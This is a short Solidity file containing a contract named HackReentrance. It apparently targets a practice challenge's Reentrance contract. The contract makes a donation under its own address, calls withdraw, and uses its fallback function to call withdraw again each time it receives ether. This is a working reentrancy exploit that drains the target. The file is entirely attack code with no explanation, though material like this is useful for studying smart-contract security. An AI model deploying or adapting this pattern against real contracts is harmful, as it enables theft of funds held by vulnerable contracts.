pragma solidity ^0.5.0;

import "./Reentrance.sol";

contract HackReentrance {
    Reentrance reentrance;
    
    constructor(address payable reentranceAddr) public {
        reentrance = Reentrance(reentranceAddr);
    }
    
    function donate() public payable {
        reentrance.donate.value(msg.value)(address(this));
    }
    
    function hack() public {
        reentrance.withdraw(1 ether);
    }
    
    function () external payable {
        hack();
    }
}